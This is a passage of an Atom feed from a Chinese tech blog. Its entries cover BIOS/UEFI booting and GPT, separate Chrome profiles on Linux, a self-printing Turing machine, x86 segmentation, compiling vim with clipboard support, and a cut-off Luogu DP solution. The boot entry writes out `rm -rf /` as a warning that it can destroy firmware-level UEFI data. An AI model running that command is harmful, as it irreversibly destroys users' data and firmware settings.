&lt;figure class=&quot;highlig
      
    
    </summary>
    
      <category term="数学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="密码学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="欧几里得算法" scheme="https://h-zex.github.io/tags/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/"/>
    
      <category term="扩展欧几里得" scheme="https://h-zex.github.io/tags/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97/"/>
    
      <category term="二进制欧几里得算法" scheme="https://h-zex.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Booting a System</title>
    <link href="https://h-zex.github.io/2018/09/17/Booting-a-System/"/>
    <id>https://h-zex.github.io/2018/09/17/Booting-a-System/</id>
    <published>2018-09-17T01:22:08.000Z</published>
    <updated>2019-07-02T15:43:52.221Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Legacy-BIOS"><a href="#Legacy-BIOS" class="headerlink" title="Legacy BIOS"></a>Legacy BIOS</h2><ul><li>传统的bios假设boot device start with a record called MBR，MBR512个字节，包含first-stage boot loader（也叫boot block）和一个分区表</li><li>无论是BIOS还是第一阶段的boot loader都没有足够的能力去读取标准的文件系统，所以第二阶段的boot loader的位置必须足够容易获取。在大多数场景下，boot block从MBR读取分区表，识别出那些marked as “active”的硬盘分区，然后其从这些分区的开头读取并运行第二阶段boot loader，这个方案被叫做”volume boot record”</li><li>第二阶段的boot loader还可以处于MBR和第一个磁盘分区之间的”dead zone”。由于历史原因，第一个磁盘分区从第64个disk block开始（MBR所在的那个是第0个block），所以这个区域包含有32KB的空间，这个空间足够包含一个文件系统驱动。这个方案通常被GRUB使用</li><li>MBR boot block是OS-agnostic的，但是因为第二阶段的boot loader有多个版本可以安装，所以第二阶段的boot loader通常是了解操作系统和文件系统的，并且是可配置的</li></ul><h3 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h3><ul><li><blockquote><p>MBR disks support only four partition table entries. For more than four partitions, a secondary structure known as an extended partition is necessary. Extended partitions can then be subdivided into one or more logical disks.</p></blockquote></li></ul><h2 id="EFI"><a href="#EFI" class="headerlink" title="EFI"></a>EFI</h2><ul><li>Intel’s extensible firmware interface (EFI) </li><li>EFI演变成UEFI（unified EFI），被多家制造商支持，不过EFI仍然是更常使用的术语。EFI和UEFI基本上可以互换使用</li></ul><h3 id="GPT"><a href="#GPT" class="headerlink" title="GPT"></a>GPT</h3><ul><li><p>The EFI partitioning scheme, known as a “GUID partition table” or GPT</p><blockquote><p>A partition is a contiguous space of storage on a physical or logical disk that functions as if it were a physically separate disk. Partitions are visible to the system firmware and the installed operating systems. Access to a partition is controlled by the system firmware before the system boots the operating system, and then by the operating system after it is started.</p></blockquote></li><li><p>只有一种分区类型（没有诸如逻辑分区），可以任意多的分区数目，有16-byte的GUID</p><blockquote><p>The specification allows an almost unlimited number of partitions. However, the Windows implementation restricts this to 128 partitions. The number of partitions is limited by the amount of space reserved for partition entries in the GPT.</p><p>The 16-byte partition type GUID, which is similar to a System ID in the partition table of an MBR disk, identifies the type of data that the partition contains and identifies how the partition is used, for example, whether it is a basic disk or a dynamic disk. Note that each GUID partition entry has a backup copy.</p></blockquote></li><li><blockquote><p><a href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-and-gpt-faq" target="_blank" rel="noopener">Windows and GPT FAQ</a></p><h5 id="Can-a-disk-be-both-GPT-and-MBR"><a href="#Can-a-disk-be-both-GPT-and-MBR" class="headerlink" title="Can a disk be both GPT and MBR?"></a>Can a disk be both GPT and MBR?</h5><p>No. However, all GPT disks contain a Protective MBR.</p><h5 id="What-is-a-Protective-MBR"><a href="#What-is-a-Protective-MBR" class="headerlink" title="What is a Protective MBR?"></a>What is a Protective MBR?</h5><p>The Protective MBR, beginning in sector 0, precedes the GPT partition table on the disk. The MBR contains one type 0xEE partition that spans the disk.</p><h5 id="Why-does-the-GPT-have-a-Protective-MBR"><a href="#Why-does-the-GPT-have-a-Protective-MBR" class="headerlink" title="Why does the GPT have a Protective MBR?"></a>Why does the GPT have a Protective MBR?</h5><p>The Protective MBR protects GPT disks from previously released MBR disk tools such as Microsoft MS-DOS FDISK or Microsoft Windows NT Disk Administrator. These tools are not aware of GPT and don’t know how to properly access a GPT disk. Legacy software that does not know about GPT interprets only the Protected MBR when it accesses a GPT disk. These tools will view a GPT disk as having a single encompassing (possibly unrecognized) partition by interpreting the Protected MBR, rather than mistaking the disk for one that is unpartitioned.</p><h5 id="Why-would-a-GPT-partitioned-disk-appear-to-have-an-MBR-on-it"><a href="#Why-would-a-GPT-partitioned-disk-appear-to-have-an-MBR-on-it" class="headerlink" title="Why would a GPT-partitioned disk appear to have an MBR on it?"></a>Why would a GPT-partitioned disk appear to have an MBR on it?</h5><p>This occurrs when you use an MBR-only-aware disk tool to access the GPT disk.</p></blockquote></li><li><p>如果没有保护性的MBR，一些MBR-only的工具可能会认为该磁盘没有格式化所以去格式化该磁盘</p></li><li><p>不要使用不支持GPT的分区工具，这些工具会认为自己理解了磁盘布局，其实并没有。这是很危险的。</p></li></ul><h3 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a>ESP</h3><ul><li><blockquote><p>The <a href="https://en.wikipedia.org/wiki/EFI_system_partition" target="_blank" rel="noopener">EFI system partition</a> (also called ESP or EFISYS) is an OS independent partition that acts as the storage place for the EFI bootloaders, applications and drivers to be launched by the UEFI firmware. It is mandatory for UEFI boot.</p><p>The UEFI specification mandates support for the FAT12, FAT16, and FAT32 filesystems (see <a href="http://www.uefi.org/sites/default/files/resources/UEFI%20Spec%202_7_A%20Sept%206.pdf#G17.1019485" target="_blank" rel="noopener">UEFI specification version 2.7, section 13.3.1.1</a>), but any conformant vendor can optionally add support for additional filesystems; for example, Apple <a href="https://wiki.archlinux.org/index.php/Mac" target="_blank" rel="noopener">Macs</a> support (and by default use) their own HFS+ filesystem drivers.</p></blockquote></li><li><p>因为这只是一个普通的FAT分区，所以可以被操作系统挂载、读写。</p></li><li><blockquote><p>At boot time, the firmware consults the GPT partition table to identify the ESP. It then reads the configured target application directly from a file in the ESP and executes it.</p></blockquote></li></ul><h3 id="BOOT"><a href="#BOOT" class="headerlink" title="BOOT"></a>BOOT</h3><ul><li><p>没有boot block（除了Protective MBR）</p></li><li><p>在UEFI 系统，并不需要boot loader，UEFI boot target 可以是UNIX/Linux kernel，这些kernel可以被配置为direct UEFI loading。不过，实践中，为了兼容legacy BIOSes，所以还是使用了boot loader</p></li><li><p>在modern intel system，UEFI默认从<code>/efi/boot/boot64.efi</code>加载。这个路径可以作为一个参数配置</p></li><li><p>UEFI定义了很多访问系统硬件的API，在这个意义上，其已经是一个小型操作系统了，甚至有UEFI-level add-on device drivers（使用处理器无关的语言编写，存储在ESP）。操作系统可以使用这些API访问硬件，也可以直接控制硬件。</p></li><li><p>因为UEFI有formal API，所以可以在运行的操作系统修改UEFI 变量</p></li><li><p>firmware可以被mounted read/write（从可以修改UEFI变量就可以知道确实可读写）</p></li><li><p>在那些默认允许写的系统(typically, those with systemd)，<code>rm -rf /</code> 可以永久的摧毁system at fireware level。并且，除了移除文件，rm还移除variables and other UEFI information accessible through <code>/sys</code></p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Legacy-BIOS&quot;&gt;&lt;a href=&quot;#Legacy-BIOS&quot; class=&quot;headerlink&quot; title=&quot;Legacy BIOS&quot;&gt;&lt;/a&gt;Legacy BIOS&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;传统的bios假设boot device start w
      
    
    </summary>
    
      <category term="运维" scheme="https://h-zex.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="boot" scheme="https://h-zex.github.io/tags/boot/"/>
    
      <category term="unix/linux" scheme="https://h-zex.github.io/tags/unix-linux/"/>
    
  </entry>
  
  <entry>
    <title>How to Have Two Chromes at Linux</title>
    <link href="https://h-zex.github.io/2018/09/10/How-to-Have-Two-Chromes-at-Linux/"/>
    <id>https://h-zex.github.io/2018/09/10/How-to-Have-Two-Chromes-at-Linux/</id>
    <published>2018-09-10T13:26:34.000Z</published>
    <updated>2019-07-02T15:43:52.201Z</updated>
    
    <content type="html"><![CDATA[<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><ul><li>由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。</li><li>而由于JavaScript的能力比较有限，所以，我认为，构造一个新的浏览器环境来运行这个脚本应该就可以解决问题。</li><li>那么，就需要两个chrome的环境</li></ul><h3 id="chrome的用户数据"><a href="#chrome的用户数据" class="headerlink" title="chrome的用户数据"></a>chrome的用户数据</h3><ul><li>linux下chrome的默认用户数据存储在<code>/home/&lt;user-name&gt;/.config/google-chrome</code>，可以使用<code>--user-data-dir=DIR</code>参数启动chrome来使得chrome使用另一个目录作为用户data目录<blockquote><p>–user-data-dir=DIR<br>Specifies the directory that user data (your “profile”) is kept in.  Defaults to $HOME/.config/google-chrome .  Separate instances of  Google<br>Chrome  must  use  separate user data directories; repeated invocations of google-chrome will reuse an existing process for a given user data<br>directory.</p></blockquote></li><li><p>接下来</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home/&lt;user-name&gt;/.config/</span><br><span class="line">mv google-chrome xxx </span><br><span class="line"><span class="meta">#</span> 注意，不可以使用google-chrome.old，否则chrome还是会从这个文件夹获得用户名等信息</span><br><span class="line"><span class="meta">#</span> 我就是使用了google-chrome.old，结果打开新的chrome，chrome总是显示我已经登录了，然后新的google-chrome目录下的生成的新的Local State文件总是有我的个人信息</span><br></pre></td></tr></table></figure><p> 接下来，打开chrome（不加–user-data-dir参数），chrome就会生成新的google-chrome文件夹，从而就可以获得一个全新的chrome环境。然后安装需要的插件和脚本（注意，不要登录账户然后选同步设置。）</p></li><li>把chrome新创建的这个google-chrome文件夹名改为自己要的名字，然后以后要使用新环境就直接加上<code>--user-data-dir=DIR</code>参数打开chrome即可</li><li>由于chrome的用户data似乎对chrome版本比较敏感，所以还需要其他措施（当然没有似乎问题也不大——我67使用69的配置只是报个错，没有其他问题）</li></ul><h3 id="从chrome-的deb解压获得chrome从而不需要安装也可以使用chrome"><a href="#从chrome-的deb解压获得chrome从而不需要安装也可以使用chrome" class="headerlink" title="从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome"></a>从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome</h3><ul><li><code>dpkg -x xxx.deb folder</code>即可把deb包解压到folder文件夹中</li><li>然后使用使用<code>chown</code>命令修改<code>folder/opt/google/chrome/chrome-sandbox</code>的拥有者为root，然后使用<code>chmod 4755</code>修改该文件的权限，才可以使用这个chrome</li><li>使用方法，直接在<code>folder/opt/google/chrome/</code>目录下运行<code>./chrome</code>即可</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。&lt;/li&gt;
&lt;li&gt;而由于
      
    
    </summary>
    
      <category term="运维" scheme="https://h-zex.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="运维" scheme="https://h-zex.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
      <category term="小技巧" scheme="https://h-zex.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
      <category term="chrome" scheme="https://h-zex.github.io/tags/chrome/"/>
    
      <category term="linux" scheme="https://h-zex.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>打印自身的图灵机的构造</title>
    <link href="https://h-zex.github.io/2018/08/03/%E6%89%93%E5%8D%B0%E8%87%AA%E8%BA%AB%E7%9A%84%E5%9B%BE%E7%81%B5%E6%9C%BA%E7%9A%84%E6%9E%84%E9%80%A0/"/>
    <id>https://h-zex.github.io/2018/08/03/打印自身的图灵机的构造/</id>
    <published>2018-08-03T03:16:51.000Z</published>
    <updated>2019-07-02T15:43:52.077Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>以下是<em>Introduction to The Theory of Computation</em> 英文第三版的Lemma6.1、Theory6.3的个人理解 </p></li><li><p>下文中，<code>&lt;p&gt;</code> 代表图灵机p的编码</p></li></ul><ul><li>首先，根据Lemma6.1，可以有一台通用机器q，其对于任意w，打印出“输出该w的图灵机”的编码——不过并不保证这台被打印出的图灵机就是那一台生成该w的图灵机——生成w的图灵机可以有很多台，q只打印出其中一台</li><li>然后，利用上面这个东西，就可以<strong>特殊构造</strong>某机器p，其输出w，并且该机器的编码就是q输出的图灵机的编码。从而使得q从p的输出w可以反推出p本身</li><li>然后，再特殊一点，这台p输出的w刚好就是q的编码——这是可以做到的，因为q是一台已经确定的，独立于p的图灵机。那么，q的输出+p的输出就刚好是<code>&lt;p&gt;&lt;q&gt;</code> ——从而，q与p组合起来的图灵机就是一台打印出自身的图灵机</li><li>继续扩展，p可以有多部分构成，使得p和q组合起来的机器不仅仅打印出自身，还可以做其他事情。比如说，p=ab，其中a是打印出<code>&lt;q&gt;&lt;b&gt;</code> 的图灵机，b是做其他事情的图灵机。然后，图灵机q就可以打印出图灵机p。如果把他们的输出组合起来就成了<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。当图灵机a、图灵机q运行完之后，纸带上就有了<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。consider that，必然是p先运行，在纸带上留下自己的输出，然后才能q运行，从纸带上获得p的输出，来产生出<code>&lt;p&gt;</code> 。可以修改q，使得其运行后，把控制权交给图灵机b，然后图灵机b从纸带上获得<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> ，继续执行计算。</li><li>上文说的转交控制权的可以这样实现——根据图灵机b定制图灵机q，使得q的accept状态后读入空串到达图灵机b的其实状态。这时候，图灵机q的编码将依赖于图灵机b。</li><li>更进一步，再修改图灵机q，其不是使用图灵机p的所有输出，而是使用图灵机p的一部分输出来构造出<code>&lt;p&gt;</code> ，那么，图灵机p就不仅仅可以输出图灵机q的描述，还可以在纸带上留下w（w与<code>&lt;p&gt;&lt;q&gt;</code> 无关）。</li><li>那么，我们就可以有一台图灵机M，其由图灵机p、q组成，其中，p=ab，那么，这台图灵机会在q运行完后，在纸带上留下<code>w&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。然后，将控制权转给图灵机b，其执行其他计算。从而，我们的这台图灵机M其不仅仅打印出自身，还实现了图灵机b的功能。</li></ul>]]></content>
    
    <summary type="html">
    
      打印自身的图灵机的构造
    
    </summary>
    
      <category term="计算理论" scheme="https://h-zex.github.io/categories/%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA/"/>
    
    
      <category term="图灵机" scheme="https://h-zex.github.io/tags/%E5%9B%BE%E7%81%B5%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Segmentation 分段</title>
    <link href="https://h-zex.github.io/2018/06/30/Segmentation-%E5%88%86%E6%AE%B5/"/>
    <id>https://h-zex.github.io/2018/06/30/Segmentation-分段/</id>
    <published>2018-06-30T05:09:58.000Z</published>
    <updated>2019-07-02T15:43:52.177Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下内容是对mit6.828 xv6book、pcasm-book、cmu 15-410关于segment的doc的整理</p><p><a href="https://pdos.csail.mit.edu/6.828/2017/xv6/book-rev10.pdf" target="_blank" rel="noopener">xv6book</a>, <a href="https://pdos.csail.mit.edu/6.828/2017/readings/pcasm-book.pdf" target="_blank" rel="noopener">PC Assembly Language</a>, <a href="https://www.cs.cmu.edu/~410/doc/segments/segments.html" target="_blank" rel="noopener">CMU-15-410 segment </a></p></blockquote><blockquote><p>在分段中，寻址使用的是一个 <code>&lt;selector, offset&gt;</code> 的pair</p></blockquote><h4 id="real-mode"><a href="#real-mode" class="headerlink" title="real mode"></a>real mode</h4><ul><li><p>selector 保存在segment register，这是一个paragraph number。</p></li><li><blockquote><p>内存单元常常以多个byte为单元一起使用，比如，两个byte是word，4个是double word，8个是quad word，16个则是paragraph</p></blockquote></li><li><p>segmentation hardware（也就是那个进行段转换的机构）直接把selector的值乘以16然后加上offset的值得到physical address</p></li></ul><h4 id="16-bit-protected-mode"><a href="#16-bit-protected-mode" class="headerlink" title="16-bit protected mode"></a>16-bit protected mode</h4><ul><li><p>selector 同样保存在segment register中，不过现在不是单纯的paragraph number，而是包含一组信息：a segment number, a table selector flag, a request privilege level。 </p><img src="/2018/06/30/Segmentation-分段/1.gif"><p>segment number是到GDT（global decriptor table）或者LDT（local decriptor table）的index（数组下标称为array index，所以这个index就是类似数组下标的东西）。</p><p>table selector flag指示的是segment number使用的是GDT还是LDT的index</p><p>RPL（request privilege level）对于不同的段寄存器有不同的含义。对于cs寄存器，RPL设置处理器的特权级</p><blockquote><p> In this case (the %CS register), the RPL sets the privilege level of the processor</p></blockquote><p>不过，在mit 6.828的那本xv6book的Appendix B中有一幅图</p><img src="/2018/06/30/Segmentation-分段/2.png"><p>其中使用16bit的selector直接作为GDT/LDT的index，所以，这地方有一些疑点</p></li><li><p>GDT/LDT的descriptor包含base address、size和一些flag bits、privilege level，当访问内存时，处理器将offset与size相比较，如果offset&gt;= size ，则是越界访问。如果是合法的访问，则base address + offset得到 linear address</p></li></ul><h4 id="32-bit-protected-mode"><a href="#32-bit-protected-mode" class="headerlink" title="32-bit protected mode"></a>32-bit protected mode</h4><ul><li><p>80386 引入了32-bit protected mode，这个模式相对于16-bit的保护模式有两个区别——offset现在是32bit，segment 现在被切分成4K-sized 的unit，称为page。</p></li><li><p>解释一下整个地址转换流程。logical address（或者叫 virtual address） 就是<code>&lt;selector, offset&gt;</code> ，linear address就是selector 和 offset 经过segment translation 转换后得到的地址。如果没有开paging hardware，那么，linear address就直接作为physical address使用。如果有，则要查页表</p><img src="/2018/06/30/Segmentation-分段/3.png"></li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><ul><li><p>可以使用一些方法使得分段实际上跟没有起作用一样。</p></li><li><p>比如，所有的descriptor中base address都是0x00000000，size都是0xFFFFFFFF（假设是在32位的机器上），那么，segment translation的越界检查、$offset+base size * 16$ 实际上等价于无用功。所以看起来跟flat address space一样的</p></li><li><p>在xv6的boot过程中，实际上paging hardware、segmentation hardware并没有起作用</p><blockquote><p>The boot loader does not enable the paging hardware; the logical addresses that it uses are translated to linear addresses by the segmentation harware, and then used directly as physical addresses. Xv6 configures the segmentation hardware to translate logical to linear addresses without change, so that they are always equal.</p></blockquote></li><li><p>逻辑地址segmen:offset 可以得出21bit的physical address（0xffff0+0xffff=0x10ffef），但是intel 8088把第21bit直接丢掉。所以为了兼容性，虽然后面的intel cpu可以支持21bit的地址，IBM还是提供了一个向后兼容。<a href="https://wiki.osdev.org/A20_Line" target="_blank" rel="noopener">A20 Line wiki</a></p><blockquote><p>If the second bit of the keyboard controller’s output port is low, the 21st physical address bit is always cleared; if high, the 21st bit acts normally. The boot loader must enable the 21st address bit using I/O to the keyboard controller on ports 0x64 and 0x60<br>The traditional method for A20 line enabling is to directly probe the keyboard controller. The reason for this is that Intel’s 8042 keyboard controller had a spare pin which they decided to route the A20 line through. This seems foolish now given their unrelated nature, but at the time computers weren’t quite so standardized. Keyboard controllers are usually derivatives of the 8042 chip. By programming that chip accurately, you can either enable or disable bit #20 on the address bus.<br>When your PC boots, the A20 gate is always disabled, but some BIOSes do enable it for you, as do some high-memory managers (HIMEM.SYS) or bootloaders (GRUB).</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      MIT 6.828, CMU 15-410 关于segmentation的资料的整理
    
    </summary>
    
      <category term="OS" scheme="https://h-zex.github.io/categories/OS/"/>
    
    
      <category term="MIT 6.828" scheme="https://h-zex.github.io/tags/MIT-6-828/"/>
    
      <category term="OS" scheme="https://h-zex.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>vim 不支持系统剪切板的解决方案</title>
    <link href="https://h-zex.github.io/2018/06/05/vim%E4%B8%8D%E6%94%AF%E6%8C%81%E7%B3%BB%E7%BB%9F%E5%89%AA%E5%88%87%E6%9D%BF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://h-zex.github.io/2018/06/05/vim不支持系统剪切板的解决方案/</id>
    <published>2018-06-05T07:15:31.000Z</published>
    <updated>2019-07-02T15:43:51.245Z</updated>
    
    <content type="html"><![CDATA[<h3 id="判断vim是否支持系统剪切板"><a href="#判断vim是否支持系统剪切板" class="headerlink" title="判断vim是否支持系统剪切板"></a>判断vim是否支持系统剪切板</h3><ul><li><p>在终端输入<code>vim -version</code>，如果<code>clipboard</code> 那一项是<code>-clipboard</code> ，以及<code>xterm_clipboard</code> 那一项是<code>-xterm_clipboard</code> ，说明并不支持。可以通过重新编译来解决</p></li><li><p>以下引用另一位博主的解决方案，<a href="https://www.evernote.com/shard/s258/sh/8f17d13f-5040-45b4-a312-294ef7304fe5/c0c182567f72325da680fb38d66436ae" target="_blank" rel="noopener">原文地址</a></p></li><li><blockquote><p>+clipboard +xterm_clipboard</p><p>solution:</p><p>–with-x –x-includes=/usr/include/X11 –x-libraries=/usr/lib/X11</p><p>You’ll need to install the appropriate X development library like <code>xlib</code> and <code>xtst</code> for <code>--with-x</code> to work. On ubuntu it should be enough to install <code>libx11-dev</code> and <code>libxtst-dev</code>., xlibs-dev</p><p>and   sudo apt-get build-dep vim-gtk </p></blockquote></li><li><p>编译方法，在github vim 主页下载源码zip包，解压后进入第一层目录，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">./configure \</span><br><span class="line">--enable-cscope \</span><br><span class="line">--with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11 \</span><br><span class="line">--with-features=normal \</span><br><span class="line">--enable-multibyte \</span><br><span class="line">--enable-rubyinterp \</span><br><span class="line">--enable-pythoninterp \</span><br><span class="line">--with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu \</span><br><span class="line">--enable-perlinterp \</span><br><span class="line">--enable-luainterp \</span><br><span class="line">--enable-gui=gtk2 --enable-cscope --prefix=/usr</span><br><span class="line"> make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><p>上面的配置选项可以根据自己的需求修改</p><p>完成后可以在<code>src/auto/config.log</code> 查看log</p></li></ul>]]></content>
    
    <summary type="html">
    
      vim 不支持系统剪切板的解决方案
    
    </summary>
    
      <category term="运维" scheme="https://h-zex.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="vim" scheme="https://h-zex.github.io/tags/vim/"/>
    
      <category term="系统剪切板" scheme="https://h-zex.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%89%AA%E5%88%87%E6%9D%BF/"/>
    
      <category term="clipboard" scheme="https://h-zex.github.io/tags/clipboard/"/>
    
      <category term="xterm_clipboard" scheme="https://h-zex.github.io/tags/xterm-clipboard/"/>
    
  </entry>
  
  <entry>
    <title>洛谷2577 午餐</title>
    <link href="https://h-zex.github.io/2018/05/20/%E6%B4%9B%E8%B0%B72577-%E5%8D%88%E9%A4%90/"/>
    <id>https://h-zex.github.io/2018/05/20/洛谷2577-午餐/</id>
    <published>2018-05-20T00:20:06.000Z</published>
    <updated>2019-07-02T15:43:51.353Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>上午的训练结束了，THU ACM小组集体去吃午餐，他们一行N人来到了著名的十食堂。这里有两个打饭的窗口，每个窗口同一时刻只能给一个人打饭。由于每个人的口味（以及胃口）不同，所以他们要吃的菜各有不同，打饭所要花费的时间是因人而异的。另外每个人吃饭的速度也不尽相同，所以吃饭花费的时间也是可能有所不同的。</p><p>THU ACM小组的吃饭计划是这样的：先把所有的人分成两队，并安排好每队中各人的排列顺序，然后一号队伍到一号窗口去排队打饭，二号队伍到二号窗口去排队打饭。每个人打完饭后立刻开始吃，所有人都吃完饭后立刻集合去六教地下室进行下午的训练。</p><p>现在给定了每个人的打饭时间和吃饭时间，要求安排一种最佳的分队和排队方案使得所有人都吃完饭的时间尽量早。</p><p>假设THU ACM小组在时刻0到达十食堂，而且食堂里面没有其他吃饭的同学（只有打饭的师傅）。每个人必须而且只能被分在一个队伍里。两个窗口是并行操作互不影响的，而且每个人打饭的时间是和窗口无关的，打完饭之后立刻就开始吃饭，中间没有延迟。</p><p>现在给定N个人各自的打饭时间和吃饭时间，要求输出最佳方案下所有人吃完饭的时刻。</p><h4 id="输入输出格式"><a href="#输入输出格式" class="headerlink" title="输入输出格式"></a>输入输出格式</h4><p>输入格式：</p><p>第一行一个整数N，代表总共有N个人。</p><p>以下N行，每行两个整数 Ai，Bi。依次代表第i个人的打饭时间和吃饭时间。</p><p>输出格式：</p><p>一个整数T，代表所有人吃完饭的最早时刻。</p><h4 id="输入输出样例"><a href="#输入输出样例" class="headerlink" title="输入输出样例"></a>输入输出样例</h4><p>输入样例#1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">2 2</span><br><span class="line">7 7</span><br><span class="line">1 3</span><br><span class="line">6 4</span><br><span class="line">8 5</span><br></pre></td></tr></table></figure><p>输出样例#1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">17</span><br></pre></td></tr></table></figure><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h4 id="吃饭时间越长越早排队"><a href="#吃饭时间越长越早排队" class="headerlink" title="吃饭时间越长越早排队"></a>吃饭时间越长越早排队</h4><ul><li>假设有一个最优分组方法，其中第一队内是按吃饭时间长短排序的——越长排在越前。然后尝试交换该队内的某两个人，<code>i</code>、<code>j</code> ——即原先是<code>i</code> 排在<code>j</code> 前面，并且两人各自的吃饭时间$b[j]&lt;b[i]$，现在交换过来</li><li>首先，交换前从队头到到<code>j</code> 总的打饭时间或者是交换后从队头到<code>i</code> 的总的打饭时间都是$T$</li><li>然后以前$T$时间后，<code>j</code> 开始吃饭，现在是$T$时间后，<code>i</code> 开始吃饭。如果以前最终吃饭完成的时间是$T+b[j]$ （$b[j]$ 是<code>j</code> 的吃饭时间），那么现在就是$T+b[i]&gt;T+b[j]$ 。如果以前最终吃饭完成时间比$T+b[j]$ 后，那么现在最终吃饭完成时间就大于或者等于$T+b[i]$ </li></ul><h4 id="如何记录状态以及状态转移方程"><a href="#如何记录状态以及状态转移方程" class="headerlink" title="如何记录状态以及状态转移方程"></a>如何记录状态以及状态转移方程</h4><ul><li><p>$dp[i][j][k]$ ：表示当排到第<code>i</code> 个人时，第一队的排队耗时是<code>j</code> ，第二队的排队耗时是<code>k</code> </p></li><li><p>先定义符号，$man[i].a$ 表示第<code>i</code> 人的打饭时间，$man[i].b$ 是第<code>i</code> 人的吃饭时间，$sum[x]=\Sigma_{i=0}^x man[i].a$</p></li><li><p>因为，对于确定的<code>i</code> ，$k=sum[i]-j$ ，所以，$dp[i][j][k]=dp[i][j][sum[i]-j]$ </p></li><li><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = MAX(dp[i<span class="number">-1</span>][j-man[i].a][k], j+man[i].b);</span><br><span class="line"><span class="keyword">int</span> y = MAX(dp[i<span class="number">-1</span>][j][k-man[i].a], k+man[i].b);</span><br><span class="line">dp[i][j][k] = dp[i][j][sum[i]-j] = MIN(x, y);</span><br></pre></td></tr></table></figure></li><li><p>之所以要取MAX，是因为$dp[i-1][j-man[i].a][k]$ 可能是第一队达到的最长吃饭完成时间，也可能是第二队达到的，而即使是第一队达到的，也有可能现在第一队最后一个吃完的时间$j+man[i].b$ 比$dp[i-1][j-man[i].a][k]$ 早，所以要取MAX</p></li><li><p>因为无需枚举<code>k</code> ，所以无需使用三维数组。并且可以使用滚动数组，从而压缩为一维数组</p></li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 